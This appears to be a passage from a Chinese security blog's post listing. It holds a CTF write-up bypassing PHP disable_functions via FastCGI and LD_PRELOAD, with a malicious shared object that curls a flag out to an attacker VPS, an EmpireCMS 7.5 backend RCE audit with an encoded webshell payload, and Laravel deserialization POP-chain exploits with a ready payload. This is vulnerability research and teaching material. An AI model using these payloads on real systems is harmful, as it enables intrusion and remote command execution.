        echo &quot;{$f}&lt;br/&gt;&quot;;
}
?&gt;</code></pre><p><img src="http://static.zybuluo.com/1160307775/ws7kk6wcaingfbutddk5mbbg/image_1dkalj2gr1c4434273c1geo1a8e64.png" alt="image_1dkalj2gr1c4434273c1geo1a8e64.png-226.6kB"></p>
<p>使用同样的copy方法上传我们的FastCGI脚本，脚本中<code>php_value</code>的值是我们的FastCGI要传给FPM的值用来修改php.ini，并且根据<code>SCRIPT_FILENAME</code>对php文件进行执行<code>/tmp/readflag.php</code>。</p>
<p>同时脚本还要修改的地方，就是使用套接字协议去加载socket。Nginx连接fastcgi的方式有2种：TCP和unix domain socket，脚本使用的即第二种形式。根据不同的php版本，找不同的fastcgi的套接字。在0CTF的题目中，大家用的是php7.2默认的FPM套接字<code>/run/php/php7.3-fpm.sock）</code>，其实FastCGI/FPM套接字都可以用，但是php5的默认</p>
<p>出题人在tmp目录已经给我们FastCGI的套接字<code>/tmp/php-cgi.sock</code>，直接修改脚本</p>
<pre><code>new Client(&quot;unix:///tmp/php-cgi.sock&quot;, -1)</code></pre><p>同时我们还要上传一个readflag.php文件作为脚本的<code>SCRIPT_FILENAME</code>，这里我让FPM为我们加载这样一个php脚本，成功读到readflag程序。但此时我们仍需要bypass disable_functions</p>
<pre><code>&lt;?php
var_dump(file_get_contents(&#39;/readflag&#39;));</code></pre><p><img src="http://static.zybuluo.com/1160307775/xvn7wtzdhnp9r0ouipcrcdbq/image_1dkaqauqt1pud86t1j5rqei74f7e.png" alt="image_1dkaqauqt1pud86t1j5rqei74f7e.png-406.1kB"></p>
<h2 id="Disable-functions的绕过"><a href="#Disable-functions的绕过" class="headerlink" title="Disable_functions的绕过"></a>Disable_functions的绕过</h2><h3 id="FastCGI加载so"><a href="#FastCGI加载so" class="headerlink" title="FastCGI加载so"></a>FastCGI加载so</h3><p>看了下Disable_functions留给我们的有putenv()</p>
<p>关于LD_PRELOAD与putenv也就不过多介绍了，飘零师傅文章写的很详细。大意就是把恶意的so文件加载到环境变量中去执行，而so是我们编译出来的c文件，包含rce的语句，这也是当时0CTF的解题思路。</p>
<p>不过在这道题中，没有安装Imagick，也没有mail函数。但是还有一个函数也会调用sendmail去开进程-&gt;error_log，后面会复现一下error_log的做法。</p>
<p>那么既然putenv()+函数是把so文件加载到环境变量中再去调用，那么我们fastcgi也完全可以做同样的事，只需要更改一下上面脚本的      <code>php_value</code>给ini添加一个extender就行了</p>
<pre><code> $php_value = &quot;allow_url_include = On\nsafe_mode = Off\nopen_basedir = /\nextension_dir = /tmp\nextension = hpdoger.so\n</code></pre><p>编译一个恶意的c文件<code>hpdoger.c</code>，这里直接用网上亘古不变的写法</p>
<pre><code>#define _GNU_SOURCE
#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
__attribute__ ((__constructor__)) void preload (void)
{
    system(&quot;curl vps:6666/`/readflag`&quot;);
}</code></pre><p>通过shared命令编译<code>gcc hpdoger.c -fPIC -shared -o hpdoger.so</code>，依然是通过copy命令上传fastcgi.php和hpdoger.so，此时/tmp下应该有这两个文件</p>
<pre><code>copy(&#39;http://vps/hpdoger.so&#39;,&#39;/tmp/hpdoger.so&#39;)</code></pre><p><img src="http://static.zybuluo.com/1160307775/jov8ot2pbsbpyzpaoft92is2/image_1dkatupe71fhkrvopqi1s0a1v5nm.png" alt="image_1dkatupe71fhkrvopqi1s0a1v5nm.png-272kB"></p>
<p>直接包含fastcgi就能加载并调用hpdoger.so-&gt;bypass base_opendir-&gt;rce</p>
<pre><code>find=.*/e%00&amp;replace=include(&#39;/tmp/fastcgi.php&#39;)&amp;id=4184&amp;regex=1`</code></pre><p><img src="http://static.zybuluo.com/1160307775/i53w4nd8brbyxs76jmx8bywu/image_1dkatnc0vgq56a717rh1dff1u7s9.png" alt="image_1dkatnc0vgq56a717rh1dff1u7s9.png-78.4kB"></p>
<h3 id="LD-PRELOAD加载so"><a href="#LD-PRELOAD加载so" class="headerlink" title="LD_PRELOAD加载so"></a>LD_PRELOAD加载so</h3><p>前文提到mail被Disable_functions了，但是mail和error_log都调用了外部进程sendmail。这里编写一个php来调用error_log，然后代码执行包含这个/tmp下的php即可rce</p>
<pre><code>&lt;?php
putenv(&quot;LD_PRELOAD=/tmp/hpdoger.so&quot;);
error_log(&#39;&#39;,1);
?&gt;</code></pre><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>自闭点在于本地环境和远程环境真的是两个概念，mac环境gcc编译和ubuntu的gcc编译出来的东西天壤之别..</p>

                
            </div>
            <div class="continue">
            <a href="/2019/09/17/从一道CTF学习Fastcgi绕过姿势/">
            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
            </a>
            </div>
        </article>
        
        <article class="post">
            <h1>
                <a class="title" href="/2019/09/09/帝国(EmpireCMS)7.5的两个后台RCE审计/"> 
                    帝国(EmpireCMS)7.5的两个后台RCE审计 
                </a>
            </h1>
                        <div class="meta">
                <a class="date"> 
                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
                    2019-09-09   
                </a>
                
                
                
                <a class="tag">
                    <i class="fa fa-tags" aria-hidden="true"></i>  
                </a>
                
                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/代码审计/">代码审计</a></li></ul>
            </div>
            <div class="content">
                
                <h1 id="帝国-EmpireCMS-7-5的两个后台RCE审计"><a href="#帝国-EmpireCMS-7-5的两个后台RCE审计" class="headerlink" title="帝国(EmpireCMS)7.5的两个后台RCE审计"></a>帝国(EmpireCMS)7.5的两个后台RCE审计</h1><p>原文首发于先知：<a href="https://xz.aliyun.com/t/6228" target="_blank" rel="noopener">https://xz.aliyun.com/t/6228</a></p>
<h2 id="后台RCE-增加自定义页面"><a href="#后台RCE-增加自定义页面" class="headerlink" title="后台RCE-增加自定义页面"></a>后台RCE-增加自定义页面</h2><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>这个漏洞挖掘最初来源于qclover师傅:<a href="http://qclover.cn/2018/10/10/EmpireCMS_V7.5%E7%9A%84%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1.html" target="_blank" rel="noopener">EmpireCMS_V7.5的一次审计</a></p>
<p>但是在这篇复现的文章中还是有一些出入的地方，比如说getshell的具体位置和成因。这里重新跟进分析一下</p>
<p>首先看一下getshell的流程，这个洞有点像黑盒to白盒<br><img src="http://static.zybuluo.com/1160307775/2r4ccien35hlqw77mo8hrqzj/image_1dje3gco735q1k5m1f11n071a634r.png" alt="image_1dje3gco735q1k5m1f11n071a634r.png-328kB"></p>
<p>增加页面功能，会在程序根目录生成一个shell.php，访问为phpinfo结果<br><img src="http://static.zybuluo.com/1160307775/2zfoc03cbjv8woa3r5gjme49/image_1djdll0r410dk6ktm7stsgrlm.png" alt="image_1djdll0r410dk6ktm7stsgrlm.png-248.3kB"></p>
<p>但是在我写入其他木马时，例如<code>&lt;?php @eval($_REQUEST[hpdoger]);?&gt;</code>，根目录却生成了一个空的shell.php文件<br><img src="http://static.zybuluo.com/1160307775/48t49l1j0m30otcu25f646zv/image_1djdlqbum1gj217cp2d61d5f1hi613.png" alt="image_1djdlqbum1gj217cp2d61d5f1hi613.png-56.4kB"></p>
<p>此时就有些疑问，推测真正的漏洞点应该不是在根目录写入一个php，应该另有它径，这里分析一下漏洞产生的真正成因。</p>
<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>入口在<code>e/admin/ecmscom.php</code>代码48行，跟进函数<code>AddUserpage</code><br><img src="http://static.zybuluo.com/1160307775/zdc2rmjeup4qfnqr5u9agc3j/image_1djdm53uj1m201n781ncr7ednrr1g.png" alt="image_1djdm53uj1m201n781ncr7ednrr1g.png-431.1kB"></p>
<p>重点关注两个参数的流程:path、pagetext<br><img src="http://static.zybuluo.com/1160307775/w2r7bolvqfafnju4ndirh0al/image_1djdm8m8l6ve645da3es96c51t.png" alt="image_1djdm8m8l6ve645da3es96c51t.png-535.4kB"></p>
<p>步入<code>RepPhpAspJspcode</code>函数</p>
<pre><code>function RepPhpAspJspcode($string){
    global $public_r;
    if(!$public_r[candocode]){
        //$string=str_replace(&quot;&lt;?xml&quot;,&quot;[!--ecms.xml--]&quot;,$string);
        $string=str_replace(&quot;&lt;\\&quot;,&quot;&amp;lt;\\&quot;,$string);
        $string=str_replace(&quot;\\&gt;&quot;,&quot;\\&amp;gt;&quot;,$string);
        $string=str_replace(&quot;&lt;?&quot;,&quot;&amp;lt;?&quot;,$string);
        $string=str_replace(&quot;&lt;%&quot;,&quot;&amp;lt;%&quot;,$string);
        if(@stristr($string,&#39; language&#39;))
        {
            $string=preg_replace(array(&#39;!&lt;script!i&#39;,&#39;!&lt;/script&gt;!i&#39;),array(&#39;&amp;lt;script&#39;,&#39;&amp;lt;/script&amp;gt;&#39;),$string);
        }
        //$string=str_replace(&quot;[!--ecms.xml--]&quot;,&quot;&lt;?xml&quot;,$string);
    }
    return $string;
}</code></pre><p>这个函数用来对pagetext参数进行了php标签的实体化，但是empirecms默认<code>public_r[candocode]</code>为null，所以这里相当于直接返回了原始pagetext的值</p>
<p>继续回到<code>AddUserpage</code>函数，接着步入<code>ReUserpage</code>函数，在e/class/functions.php的4281行<br><img src="http://static.zybuluo.com/1160307775/gyn1d0txofybrwzm1hu39r1a/image_1djdmv7bv17551oir15kv1do5sg42a.png" alt="image_1djdmv7bv17551oir15kv1do5sg42a.png-298.8kB"></p>
<p>获取程序的根路径后拼接传入的path，而后DoFileMKDir在根目录建立了shell.php</p>
<p>接着步入<code>InfoNewsBq</code>函数，也是这个漏洞产生的函数。关键代码在<code>e/class/functions.php</code>的2469-2496行</p>
<p><img src="http://static.zybuluo.com/1160307775/i3ri8ea5z4g4leh18tid1gig/image_1djdnbjo2pelbn91uh11ks21u8p2n.png" alt="image_1djdnbjo2pelbn91uh11ks21u8p2n.png-496.3kB"></p>
<p>$file参数以php结尾，通过<code>WriteFiletext</code>函数向$file中写入上一步的pagetext(这里为$indextext)，而<code>WriteFiletext</code>是没有任何过滤的</p>
<pre><code>function WriteFiletext($filepath,$string){
    global $public_r;
    $string=stripSlashes($string);
    $fp=@fopen($filepath,&quot;w&quot;);
    @fputs($fp,$string);
    @fclose($fp);
    if(empty($public_r[filechmod]))
    {
        @chmod($filepath,0777);
    }
}</code></pre><p>于是在<code>e/data/tmp</code>目录下，以模版文件的形式写入webshell，同时也将AddCheckViewTempCode()返回的权鉴方法写了进去，所以我们不能直接以url的方式访问这个webshell。<br><img src="http://static.zybuluo.com/1160307775/zp17zrn2j1muego2qa7p9din/image_1djdo4l1d1gte63t1qcb1a73aho4e.png" alt="image_1djdo4l1d1gte63t1qcb1a73aho4e.png-278.6kB"></p>
<p>但是仍有方法使这个webshell执行并将结果输出。原因在下面这几行<br><img src="http://static.zybuluo.com/1160307775/ecp2rqbzer4w4xk8lw33ghcz/image_1djdnjf5p1b2p1oan4pqn7bd2434.png" alt="image_1djdnjf5p1b2p1oan4pqn7bd2434.png-564.3kB"></p>
<p>由于入口处定义了常量<code>InEmpireCMS</code>，ob_get_contents可以读取缓冲区的输出，而输出正好是刚才我们包含进去的shell的结果。因此执行了phpinfo()后将要输出到浏览器的内容赋值给了$string变量并返回，在<code>ReUserpage</code>函数中又进行了一次写入，缓冲结果写入的根目录下的shell.php，造成一个表面getshell的现象，其实是一种rce。</p>
<p><img src="http://static.zybuluo.com/1160307775/ceu2e6w6h3a09qkm8krde4sx/image_1djdnpbbj180fdns1d2h1bvd1neu3h.png" alt="image_1djdnpbbj180fdns1d2h1bvd1neu3h.png-355.3kB"></p>
<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>设置<code>$public_r[candocode]</code>为true进行写入内容的过滤</p>
<h2 id="后台首页模版处rce到getshell"><a href="#后台首页模版处rce到getshell" class="headerlink" title="后台首页模版处rce到getshell"></a>后台首页模版处rce到getshell</h2><p>承接上一个漏洞，整个empirecms不少用到ob_get_contents的地方，所以就想挖掘一下还有没有其他可以利用的点，最后把眼光锁在增加模版处。</p>
<h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>在后台模版功能处，选择管理首页模版，然后点击增加首页方案<br><img src="http://static.zybuluo.com/1160307775/92bdlk6m16ygken7p4xw18dj/image_1djp1p7ed1g6q1vs61qof19pb7cjm.png" alt="image_1djp1p7ed1g6q1vs61qof19pb7cjm.png-226.2kB"></p>
<p>复制下面的payload，填写到模版内容处，点击提交。</p>
<pre><code>&lt;?php 
$aa = base64_decode(ZWNobyAnPD9waHAgZXZhbCgkX1JFUVVFU1RbaHBdKTsnPnNoZWxsLnBocA);
${(system)($aa)};
?&gt;</code></pre><p><img src="http://static.zybuluo.com/1160307775/86i5w3sopy8hik249iozojxo/image_1djp1rm8v2kc1s6l1f3b1g59cjk1g.png" alt="image_1djp1rm8v2kc1s6l1f3b1g59cjk1g.png-311.9kB"></p>
<p>其中base64编码部分为</p>
<pre><code>ZWNobyAnPD9waHAgZXZhbCgkX1JFUVVFU1RbaHBdKTsnPnNoZWxsLnBocA
=&gt;
echo &#39;&lt;?php eval($_REQUEST[hp]);&#39;&gt;shell.php</code></pre><p>再点击<strong>启用此方案</strong>即可getshell，在<code>e/admin/template/</code>目录下生成shell.php</p>
<p><img src="http://static.zybuluo.com/1160307775/jck0izcors9rxr3b8ydk78gf/image_1djp21du0o250ocp31lnuad21t.png" alt="image_1djp21du0o250ocp31lnuad21t.png-64.3kB"><br><img src="http://static.zybuluo.com/1160307775/jeakcfnhj6ljtu09tq4tcsnu/image_1djp23v55qua1pa11b021uir1qmp2a.png" alt="image_1djp23v55qua1pa11b021uir1qmp2a.png-278.2kB"></p>
<h3 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>在e/class/functions.php的<code>NewsBq</code>函数中调用<code>WriteFiletext</code>函数向/e/data/tmp/index.php中写入文件并包含<br><img src="http://static.zybuluo.com/1160307775/vngxtn93avtnyhl4ix12mndr/image_1djp2kjth3i01l78dg91q3g1lba2n.png" alt="image_1djp2kjth3i01l78dg91q3g1lba2n.png-588.3kB"></p>
<p>查找一下哪些地方调用<code>NewsBq</code>函数，最后锁定在<code>e/admin/template/ListIndexpage.php</code>的<code>DefIndexpage</code>中<br><img src="http://static.zybuluo.com/1160307775/w6dlwq628kgerrrfr67flxfq/image_1djp2t8jo6ej1l7t1ui9t9i734.png" alt="image_1djp2t8jo6ej1l7t1ui9t9i734.png-459.9kB"></p>
<p>首先从库里获取得到<code>$r[temptext]</code>作为参数传入NewsBq，此时<code>$class</code>为null。那么文件内容可控吗？查看一下入库的语句，看看存不存在任意写入，全局搜索<code>enewsindexpage</code></p>
<p>在同文件ListIndexpage.php的第23行到47行，调用insert语句向<code>enewsindexpage</code>中增加数据，关键代码如下</p>
<pre><code>function AddIndexpage($add,$userid,$username){
    global $empire,$dbtbpre;
    if(!$add[tempname]||!$add[temptext])
    {
        printerror(&quot;EmptyIndexpageName&quot;,&quot;history.go(-1)&quot;);
    }
    ...
    $add[tempname]=hRepPostStr($add[tempname],1);
    $add[temptext]=RepPhpAspJspcode($add[temptext]);
    $sql=$empire-&gt;query(&quot;insert into {$dbtbpre}enewsindexpage(tempname,temptext) values(&#39;&quot;.$add[tempname].&quot;&#39;,&#39;&quot;.eaddslashes2($add[temptext]).&quot;&#39;);&quot;);
    ...
}</code></pre><p>调用AddIndexpage的入口为：</p>
<pre><code>$enews=$_POST[&#39;enews&#39;];
if(empty($enews))
{$enews=$_GET[&#39;enews&#39;];}

if($enews==&quot;AddIndexpage&quot;)
{
    AddIndexpage($_POST,$logininid,$loginin);
}</code></pre><p>所以<code>$add</code>为<code>$_POST</code>获取的数组，经过一次<code>eaddslashes2</code>函数清洗后以temptext字段存入库，而<code>eaddslashes2</code>在内部调用的是addslashes。猜想开发者最初可能只是为了防止sql注入，而没有进行其他类型过滤。但是我们执行任意命令是可以绕过addslashes的限制，取出来temptext字段来rce。</p>
<p>只需要用到复杂变量：<a href="https://www.jianshu.com/p/7c818ddc5731" target="_blank" rel="noopener">PHP复杂变量绕过addslashes()直接拿shell</a></p>
<p>整理思路：入库rce语句-&gt;取出库-&gt;写文件-&gt;包含rce-&gt;getshell</p>
<h3 id="漏洞修复-1"><a href="#漏洞修复-1" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>对入库语句进行过滤，建议在<code>eaddslashes2</code>中增加一些过滤机制</p>

                
            </div>
            <div class="continue">
            <a href="/2019/09/09/帝国(EmpireCMS)7.5的两个后台RCE审计/">
            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
            </a>
            </div>
        </article>
        
        <article class="post">
            <h1>
                <a class="title" href="/2019/08/25/Laravel由destrcuct引起的两处反序列化RCE分析/"> 
                    Laravel由destrcuct引起的两处反序列化RCE分析 
                </a>
            </h1>
                        <div class="meta">
                <a class="date"> 
                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
                    2019-08-25   
                </a>
                
                
                
                <a class="tag">
                    <i class="fa fa-tags" aria-hidden="true"></i>  
                </a>
                
                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/代码审计/">代码审计</a></li></ul>
            </div>
            <div class="content">
                
                <h1 id="Laravel由destrcuct引起的两处反序列化RCE分析"><a href="#Laravel由destrcuct引起的两处反序列化RCE分析" class="headerlink" title="Laravel由destrcuct引起的两处反序列化RCE分析"></a>Laravel由destrcuct引起的两处反序列化RCE分析</h1><p>文章首发于安全客:<a href="https://www.anquanke.com/post/id/184541" target="_blank" rel="noopener">https://www.anquanke.com/post/id/184541</a></p>
<p>laravel本身没有反序列化的调用机制，只有依赖于二次开发或者敏感函数才能触发反序列化。在Laravel5.3以后的版本引入<code>Illuminate\Broadcasting\PendingBroadcast.php</code>文件，存在__destrcut魔法函数引发一系列问题。这里我对框架本身能造成rce的点进行分析，一处是三方组件fzaninotto的回调调用<code>call_user_func_array</code>造成的rce，另一处是<br>p神在lumenserial找到laravel核心库的一处任意函数调用。</p>
<h1 id="Laravel自加载组件fzaninotto组件RCE"><a href="#Laravel自加载组件fzaninotto组件RCE" class="headerlink" title="Laravel自加载组件fzaninotto组件RCE"></a>Laravel自加载组件fzaninotto组件RCE</h1><h2 id="版本说明"><a href="#版本说明" class="headerlink" title="版本说明"></a>版本说明</h2><p><code>fzaninotto</code>在laravel 5.1以后composer默认安装<br><img src="http://static.zybuluo.com/1160307775/fc1ugl8qu5rkggox43xanknq/image_1dhoajden1lhl1rrdc1i18qr82s9.png" alt="image_1dhoajden1lhl1rrdc1i18qr82s9.png-164.8kB"></p>
<p><code>autoload_classmap.php</code>可以看到，在进行依赖加载的时候默认将<code>/fzaninotto/faker/src/Faker/Generator.php</code>注册到全局变量<code>$classmap</code>中，在程序调用相关类时遵从PSR4的规范，也就是说我们反序列化是可以调用<code>/fzaninotto/faker/src/Faker/</code>目录下的任何文件。</p>
<p><img src="http://static.zybuluo.com/1160307775/zrpwx3p0q227if3wqkeaucgd/image_1dhoalu3vkne6bp7mf1nfj7qhm.png" alt="image_1dhoalu3vkne6bp7mf1nfj7qhm.png-751.3kB"></p>
<h2 id="适用条件"><a href="#适用条件" class="headerlink" title="适用条件"></a>适用条件</h2><ul>
<li>laravel 5.3-5.8</li>
<li>寻找可控的反序列化点，才能触发该漏洞</li>
</ul>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>本地搭建laravel最新的环境 5.8.29<br><img src="http://static.zybuluo.com/1160307775/n45b5dlbpcdyukkok7h2sezo/image_1dhobbpoc1j5p1toc1rf71rd729l9.png" alt="image_1dhobbpoc1j5p1toc1rf71rd729l9.png-332kB"></p>
<p>构造一个反序列化可控点，在<code>app/Http/Controllers</code>文件夹下创建文件TaskController.php，源码如下:</p>
<pre><code>&lt;?php
namespace App\Http\Controllers;

class TaskController
{
    public function index(){
        unserialize($_GET[&#39;url&#39;]);
    }
}</code></pre><p>在<code>routes/web.php</code>文件中添加这样路由记录</p>
<pre><code>Route::get(&#39;/bug&#39;, &#39;TaskController@index&#39;);</code></pre><p><img src="http://static.zybuluo.com/1160307775/9txqyfac02ns2bq2tp9n9s8c/image_1dhoc20tt1p37lmb30g19m1s1v13.png" alt="image_1dhoc20tt1p37lmb30g19m1s1v13.png-234.4kB"></p>
<h2 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><pre><code>&lt;?php
//exp.php
namespace Faker{
    class Generator{
        protected $formatters = array();

        public function __construct($formatters)
        {
            $this-&gt;formatters = $formatters;
        }
    }
}

namespace Illuminate\Broadcasting{
    class PendingBroadcast.php``
    {
        protected $events;
        protected $event;

        public function __construct($events, $event)
        {
            $this-&gt;events = $events;
            $this-&gt;event = $event;
        }

    }
}

namespace{
    $generator = new Faker\Generator(array(&quot;dispatch&quot;=&gt;&quot;system&quot;));
    $PendingBroadcast = new Illuminate\Broadcasting\PendingBroadcast($generator,&quot;id&quot;);
    echo urlencode(serialize($PendingBroadcast));

}</code></pre><p>运行exp.php生成poc，如果环境搭建没有问题，直接请求下面的uri既能看到rce效果</p>
<pre><code>bug?url=O%3A40%3A&quot;Illuminate%5CBroadcasting%5CPendingBroadcast&quot;%3A2%3A%7Bs%3A9%3A&quot;%00%2A%00events&quot;%3BO%3A15%3A&quot;Faker%5CGenerator&quot;%3A1%3A%7Bs%3A13%3A&quot;%00%2A%00formatters&quot;%3Ba%3A1%3A%7Bs%3A8%3A&quot;dispatch&quot;%3Bs%3A6%3A&quot;system&quot;%3B%7D%7Ds%3A8%3A&quot;%00%2A%00event&quot;%3Bs%3A2%3A&quot;id&quot;%3B%7D</code></pre><p><img src="http://static.zybuluo.com/1160307775/ci645ofexwzuhhscrh6ix4bj/image_1dhocrcl7t951nqna0abdu19l71t.png" alt="image_1dhocrcl7t951nqna0abdu19l71t.png-97.7kB"></p>
<h3 id="EXP流程"><a href="#EXP流程" class="headerlink" title="EXP流程"></a>EXP流程</h3><p>在入口设置断点，传入payload<br><img src="http://static.zybuluo.com/1160307775/endgg8ppidelbmgxxi0uj1po/image_1dhod29lhevt1urr1u8j8v1pf32a.png" alt="image_1dhod29lhevt1urr1u8j8v1pf32a.png-239.1kB"></p>
<p>步入<code>Illuminate\Foundation\AliasLoader</code>的load函数，检测要实例的对象是否是laravel注册门面类，这里不满足条件<br><img src="http://static.zybuluo.com/1160307775/nipw8jf21ejjop49p2qvv1ss/image_1dhod50m81hlejqdltvv31ldd2n.png" alt="image_1dhod50m81hlejqdltvv31ldd2n.png-189.3kB"></p>
<p>因此步入<code>Composer\Autoload\ClassLoader</code>查找相应class对应于vendor中的php文件。也就是上文提到的laravel在加载服务容器时会执行的<code>autoload_class</code>作用结果</p>
<p><img src="http://static.zybuluo.com/1160307775/gnp5zqdryec1r1xm0swduzss/image_1dhoh4r22a9ln89upkgff5o53h.png" alt="image_1dhoh4r22a9ln89upkgff5o53h.png-531.1kB"></p>
<p>看到调用栈能够成功读取到<code>Faker\Generato</code>文件，并返回给includefile()</p>
<p>载入文件后步入到了反序列化的入口__destruct函数<br><img src="http://static.zybuluo.com/1160307775/xer6dqy2miqhm9n65n4f6ryi/image_1dhohl8c1b005lhch91ier1sij4o.png" alt="image_1dhohl8c1b005lhch91ier1sij4o.png-261.2kB"></p>
<p>步入执行dispatch函数，跳转到<code>vendor/fzaninotto/faker/src/Faker/Generator.php</code>的call方法<br><img src="http://static.zybuluo.com/1160307775/7mscxmikz6sh3m5vm6n71aga/image_1dhohf6ii1qp5uk41vb81emh1tvi3u.png" alt="image_1dhohf6ii1qp5uk41vb81emh1tvi3u.png-347.9kB"></p>
<p>跟进format函数如下图，发现此时的$arguments为可控值即我们序列化传入的$this-&gt;event<br><img src="http://static.zybuluo.com/1160307775/b913247o6m4bapk67pg329k8/image_1dhohhel0113lp9j14iq1o7g1deg4b.png" alt="image_1dhohhel0113lp9j14iq1o7g1deg4b.png-436.8kB"></p>
<p>继续步入看看getFormatter函数的具体实现</p>
<pre><code>public function getFormatter($formatter) # formatter  = dispatch
{
    if (isset($this-&gt;formatters[$formatter])) { # formatters可控
        return $this-&gt;formatters[$formatter];
    }
    foreach ($this-&gt;providers as $provider) {
        if (method_exists($provider, $formatter)) {
            $this-&gt;formatters[$formatter] = array($provider, $formatter);

            return $this-&gt;formatters[$formatter];
        }
    }
    throw new \InvalidArgumentException(sprintf(&#39;Unknown formatter &quot;%s&quot;&#39;, $formatter));
}</code></pre><p>判断formatters[formatter]存在即返回，然而formatters也是我们可控的，那就能返回任意函数名了。即call_user_func_arrary的函数名和函数值都可控，rce实现～<br><img src="http://static.zybuluo.com/1160307775/n5f8fm6zdtweygg047xhitdb/image_1dhoj1sdkbh3110j1vmq123efuf65.png" alt="image_1dhoj1sdkbh3110j1vmq123efuf65.png-95.9kB"></p>
<h1 id="Dispatcher处存在任意函数调用"><a href="#Dispatcher处存在任意函数调用" class="headerlink" title="Dispatcher处存在任意函数调用"></a>Dispatcher处存在任意函数调用</h1><p>首先还是看一下造成漏洞的点在<code>vendor/laravel/framework/src/Illuminate/Bus/Dispatcher.php</code>，允许我们使用<code>call_user_func</code>进行任意函数调用，且参数可控。<br><img src="http://static.zybuluo.com/1160307775/ceenl8t6uw3aipnvsc9x93p8/image_1dhnv8s401hhqdai12u51uqgia1p.png" alt="image_1dhnv8s401hhqdai12u51uqgia1p.png-110.2kB"></p>
<p>接着我们从源头追pop。入口方法依然在<code>vendor/laravel/framework/src/Illuminate/Broadcasting/PendingBroadcast.php</code>中，__destrcut执行dispatch函数<br><img src="http://static.zybuluo.com/1160307775/pdv4vp3nt9no1k94wb5jujkc/image_1dhnvcu1b1koj1f5o3oh9e1blr16.png" alt="image_1dhnvcu1b1koj1f5o3oh9e1blr16.png-108.5kB"></p>
<p>这次全局搜索哪些类存在dispatch函数，正好dispatcher本身中就存在，而且调用到了漏洞触发函数<code>dispatchToQueue</code>去执行<code>call_user_func</code></p>
<p><img src="http://static.zybuluo.com/1160307775/3vrpkiph81avi6cc2187ao5l/image_1dhnvi8t69udppb8bdhpo1sq11j.png" alt="image_1dhnvi8t69udppb8bdhpo1sq11j.png-167.8kB"></p>
<p>这里首先进行了如下条件判断</p>
<pre><code>$this-&gt;queueResolver &amp;&amp; $this-&gt;commandShouldBeQueued($command)</code></pre><p>跟进<code>commandShouldBeQueued</code>发现command参数必须是继承自    <code>ShouldQueue</code>接口的对象才能进入判断，这点我们可以通过序列化控制$command为对象。<br><img src="http://static.zybuluo.com/1160307775/9szugjpwpov3c0v9bj9r5so6/image_1dhnvu6om1vfb1i9vfqrkjnk7u30.png" alt="image_1dhnvu6om1vfb1i9vfqrkjnk7u30.png-34.1kB"></p>
<p>只需要全局搜一下哪个类实现了<code>ShouldQueue</code>接口，这里使用<code>BroadcastEvent</code><br><img src="http://static.zybuluo.com/1160307775/7b6akvknkvytxn922rfymihj/image_1dho0anindq2h3e12jnoj3vl23t.png" alt="image_1dho0anindq2h3e12jnoj3vl23t.png-228.8kB"></p>
<p>判断走通回到dispather，进行函数<code>dispatchToQueue</code>调用，<code>$connection</code>参数取自<code>$command</code>的connection属性<br><img src="http://static.zybuluo.com/1160307775/er9kg4fp6hp4rdcgorvkjfut/image_1dho0e2svl3kjdg166r1qv61cae4a.png" alt="image_1dho0e2svl3kjdg166r1qv61cae4a.png-137.1kB"></p>
<p>但是<code>BroadcastEvent</code>没有connection属性。不过没有关系，我们自己序列化可以给类添加任何想要的属性。因为反序列化的时候不执行该类__contrust，自然也不会在<code>BroadcastEvent</code>中报错。</p>
<p>流程就这么简单，构造每个类的属性，让条件走通就行了。构造的exp</p>
<pre><code>&lt;?php

namespace Illuminate\Broadcasting{
    class PendingBroadcast
    {
        protected $events;
        protected $event;

        public function __construct($events, $event)
        {
            $this-&gt;events = $events;
            $this-&gt;event = $event;
        }

    }

    class BroadcastEvent
    {
      protected $connection;

      public function __construct($connection)
      {
        $this-&gt;connection = $connection;
      }
    }

}

namespace Illuminate\Bus{
    class Dispatcher{
        protected $queueResolver;

        public function __construct($queueResolver)
        {
          $this-&gt;queueResolver = $queueResolver;
        }

    }
}

namespace{
    $command = new Illuminate\Broadcasting\BroadcastEvent(&quot;whoami&quot;);

    $dispater = new Illuminate\Bus\Dispatcher(&quot;system&quot;);

    $PendingBroadcast = new Illuminate\Broadcasting\PendingBroadcast($dispater,$command);

    echo urlencode(serialize($PendingBroadcast));

}</code></pre><p>只不过是没有回显，需要我们可以外带出去，这里调试的结果成功执行system获取whoami为hpdoger<br><img src="http://static.zybuluo.com/1160307775/72f5906tt0oafrk68hj4q2yl/image_1dho0phn5uka1c5316dv1g8n1ckr4n.png" alt="image_1dho0phn5uka1c5316dv1g8n1ckr4n.png-351.9kB"></p>

                
            </div>
            <div class="continue">
            <a href="/2019/08/25/Laravel由destrcuct引起的两处反序列化RCE分析/">
            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
            </a>
            </div>
        </article>
        
        <article class="post">
            <h1>
                <a class="title" href="/2019/08/13/从一次漏洞挖掘入门ldap注入/"> 
                    从一次漏洞挖掘入门ldap注入 
                </a>
            </h1>
                        <div class="meta">
                <a class="date"> 
                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
                    2019-08-13   
                </a>
                
                
                
                <a class="tag">
